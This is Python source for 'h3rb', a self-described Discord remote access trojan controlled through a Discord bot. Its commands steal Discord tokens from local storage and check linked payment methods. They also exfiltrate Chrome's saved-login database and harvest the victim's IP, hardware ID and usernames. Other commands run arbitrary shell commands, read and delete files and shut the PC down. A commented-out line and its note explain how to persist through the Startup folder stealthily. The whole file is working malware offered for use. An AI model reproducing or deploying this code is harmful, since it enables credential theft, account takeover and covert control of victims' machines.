
#imports
import re, os, requests, json, shutil, discord, webbrowser, ctypes, browserhistory, shutil, random
from discord.ext import commands
from base64 import b64decode
from json import loads
from cfonts import render, say 
import asyncio
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import platform as plt

#variables
output = render('   >h3rb', colors=['white', 'green']) #ascii!

#getting os info
OS = plt.platform().split("-")
name = os.getenv("UserName")
Username = os.getenv("COMPUTERNAME")
dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}

# shutil.copy("backdoor.py", fr"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") 
#uncomment ^^ for run on startup; I advise using a .pyw before encrypting for stealth if you're going with this.

BotToken = "" #Your token here!
client = commands.Bot(command_prefix=">")
client.remove_command("help")

#functions
def WinMsg(Name, Value): #defining embeds for later (so we don't have to copy paste all over again
    embed = discord.Embed(title = ":seedling:  h3rb", color=0x03fc0b)
    embed.add_field(name = f"{Name}", value = f"{Value}")
    embed.set_footer(text = "h3rb・Discord RAT")
    return embed

def ErrorMsg(): #beep-boop error :/
    embed = discord.Embed(title = ":seedling:  h3rb", color=0x03fc0b) 
    embed.add_field(name = "Error", value = f"Error Occurred.")
    embed.set_footer(text = "h3rb・Discord RAT")
    return embed

#getting user info for later commands.
def GetIP():
    return requests.get("https://api.ipify.org/").text
startip = str(GetIP())

def Hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def Payment(token):
            try:
                return loads(urlopen(Request("https://discord.com/api/v8/users/@me/billing/payment-sources", headers={"authorization": token, "content-type": "application/json"}).read().decode()))
            except:
                pass
                
#super awesome animated status (as always)
async def status_task():
    while True:
        await client.change_presence(activity=discord.Game(name="Sm0Kin h3rb /"))
        await asyncio.sleep(1.5)
        await client.change_presence(activity=discord.Game(name="Sm0Kin h3r -"))
        await asyncio.sleep(1.5)
        await client.change_presence(activity=discord.Game(name="Sm0Kin h3 \\"))
        await asyncio.sleep(1.5)
        await client.change_presence(activity=discord.Game(name="Sm0Kin h |"))
        await asyncio.sleep(1.5)
        await client.change_presence(activity=discord.Game(name="Sm0Kin h3 /"))
        await asyncio.sleep(1.5)
        await client.change_presence(activity=discord.Game(name="Sm0Kin h3r -"))
        await asyncio.sleep(1.5)
        await client.change_presence(activity=discord.Game(name="Sm0Kin h3rb \\"))
        await asyncio.sleep(1.5)
        
#get dem' mf tokenz!
def Tokens(path):
    tokens = []

    for file in os.listdir(path):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue
        for l in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
            for mst in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(mst, l):
                    tokens.append(token)
    return tokens


#/when connection recieved (program opened by client, this also opens the bot so we don't need to use sockets)
@client.event
async def on_ready():
    os.system('cls')
    print(output)
    print("         h3rb has started... waiting for commands.")
    client.loop.create_task(status_task())


#search through discord path for token(s)
@client.command()
async def tokens(ctx):
    print(" ")
    print("         log@h3rb ~ >tokens command activated")
    for platform, path in dire.items():
        for token in Tokens(path):
            uid = None
            if not token.startswith("mfa."): #b64 decode dat shitz
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in ids:
                    continue
            ids.append(uid)
    await ctx.send(embed = WinMsg(f"`Token(s) Found`", f"```Token: {token}```"))


#use requests to recieve method. (use token as header)
@client.command()
async def payment(ctx):
    print(" ")
    print("         log@h3rb ~ >payment command activated")
    for platform, path in dire.items():
        for token in Tokens(path):
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in ids:
                    continue
            ids.append(uid)
            payment = bool(Payment(token))
    await ctx.send(embed = WinMsg(f"`Token: {token}`", f"Payment Method: {payment}"))

@client.command()
async def tokenfuck(ctx):
    print(" ")
    print("         log@h3rb ~ >tokenfuck command activated")
    for platform, path in dire.items():
        for token in Tokens(path):
            uid = None
            if not token.startswith("mfa."): #b64 decode dat shitz
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                    if not uid or uid in ids:
                        continue
            ids.append(uid)
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/1v1"
        headers={
        'Authorization': token
        }
        requests.post(apilink, headers=headers)
    else:
        await ctx.send(embed = ErrorMsg())

#send some information about the clients PC
@client.command()
async def check(ctx):
    print(" ")
    print("         log@h3rb ~ >check command activated")
    OS = plt.platform().split("-")
    name = os.getenv("UserName")
    UserName = os.getenv("COMPUTERNAME")
    messages = f"```\nIP ADDRESS: {GetIP()}\n```" +  f"```\nHWID: {Hwid()}\n```" + f"```\nUSERNAME: {name}\n```" + f"```\nPC NAME: {UserName}\n```" + f"```\nPRODUCT NAME: {OS[0]} {OS[1]}\n```"
    await ctx.send(embed = WinMsg(f"`{name}'s Information`", f"{messages}"))


#run a custom cmd 
@client.command()
async def cmd(ctx, command):
    print(" ")
    print("         log@h3rb ~ >look command activated")
    cmd_done = os.system(command)
    cmd_done = str(cmd_done)
    if cmd_done == "0":
        await ctx.send(embed = WinMsg("`Output:`", "```Command was executed successfully.```"))
    else:
        await ctx.send(embed = WinMsg("`Output:`", "```There was an ERROR! Command not executed.```"))





#bad method of grabbing chrome data, I will implement my 'chrome-data-grabber' here soon.
@client.command()
async def chrome(ctx):
    print(" ")
    print("         log@h3rb ~ >chrome command activated")
    await ctx.send(file = discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))


#run a custom URL on clients machine
@client.command()
async def run(ctx, url):
    print(" ")
    print("         log@h3rb ~ >run command activated")
    webbrowser.open(url)
    await ctx.send(embed = WinMsg("`URL Opened!`", f"```[>] URL Opened Successfully - {url}```"))


#open a message-box on the clients machine (uses not batch)
@client.command()
async def message(ctx, *msg):
    print(" ")
    print("         log@h3rb ~ >message command activated")
    ctypes.windll.user32.MessageBoxW(0, " ".join(msg), "", 1)
    await ctx.send(embed = WinMsg("`MessageBox`", f"```[>] MessageBox Sent Successfully - " + " ".join(msg) + "```"))


#check system privileges (check if program ran as admin)
@client.command()
async def admin(ctx):
    print(" ")
    print("         log@h3rb ~ >admin command activated")
    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if admin == True:
        await ctx.send(embed = WinMsg("`Privilege Check`", "```[>] h3rb has administrative privileges```"))
    elif admin == False:
        await ctx.send(embed = WinMsg("`Privilege Check`", "```[>] h3rb does not have administrative privileges```"))


#shutdown pc (trollololololol)
@client.command()
async def shutdown(ctx):
    print(" ")
    print("         log@h3rb ~ >shutdown command activated")
    os.system("shutdown /s /t 1")
    await ctx.send(embed = WinMsg("`Shutdown Command`", "```[>] Shutdown Successful```"))


#send current work dir
@client.command()
async def cwd(ctx):
    print(" ")
    print("         log@h3rb ~ >cwd command activated")
    get = os.getcwd()
    cwd = str(get)
    await ctx.send(embed = WinMsg("`Current Directory Path`", f"```{cwd}```"))


#send a custom directories files/folders
@client.command()
async def look(ctx, dir):
    print(" ")
    print("         log@h3rb ~ >look command activated")
    dir = os.listdir(dir)
    await ctx.send(f"`Directory Files:`")
    await ctx.send(f"```{dir}```")


#remove a custom file of users choice
@client.command()
async def remove(ctx, file):  
    print(" ")
    print("         log@h3rb ~ >remove command activated")
    os.remove(file)
    await ctx.send(embed = WinMsg(f"`Successfully Removed File:`", f"```{file}```"))


#read files content
@client.command()
async def read(ctx, file):
    print(" ")
    print("         log@h3rb ~ >read command activated")
    files = open(file, "r").read()
    try:
        await ctx.send(embed = WinMsg(f"`File Content: `", f"```\n{files}\n```"))
    except:
        await ctx.send(f"`File Content:`")
        await ctx.send(f"```\n{files}\n```")


#basically the help menu
@client.command()
async def menu(ctx):
    print(" ")
    print("         log@h3rb ~ >menu command activated")
    embed = discord.Embed(title = ":seedling: 1 [Misc Commands]", color=0x03fc0b)
    embed.add_field(name = ">message <msg>", value = "Send Message Box",  inline=False)
    embed.add_field(name = ">run <url>", value = "Open a URL",  inline=False)
    embed.add_field(name = ">admin", value = "Check admin privileges",  inline=False)
    await ctx.send(embed = embed)
    embed = discord.Embed(title = ":seedling: 2 [File Commands]", color=0x03fc0b)
    embed.add_field(name = ">cwd", value = "Print current directory",  inline=False)
    embed.add_field(name = ">look <dir>", value = "Print custom directory",  inline=False)
    embed.add_field(name = ">read <dir>", value = "Read file content",  inline=False)
    embed.add_field(name = ">remove <file>", value = "Remove a file",  inline=False)
    await ctx.send(embed = embed)
    embed = discord.Embed(title = ":seedling: 3 [PC Commands]", color=0x03fc0b)
    embed.add_field(name = ">shutdown", value = "Shutdown the PC",  inline=False)
    embed.add_field(name = ">check", value = "Get Victim Info",  inline=False)
    embed.add_field(name = ">cmd <command>", value = "Run Custom Command",  inline=False)
    embed.add_field(name = ">chrome", value = "Scrape all Chrome Data",  inline=False)
    await ctx.send(embed = embed)
    embed = discord.Embed(title = ":seedling: 4 [Discord Commands]", color=0x03fc0b)
    embed.add_field(name = ">payment", value = "Discord Payment Method",  inline=False)
    embed.add_field(name = ">tokenfuck", value = "Destroy Token",  inline=False)
    embed.add_field(name = ">tokens", value = "Get Discord Token(s)",  inline=False)
    embed.set_footer(text = "h3rb・Discord RAT")
    await ctx.send(embed = embed)
    
client.run(BotToken)
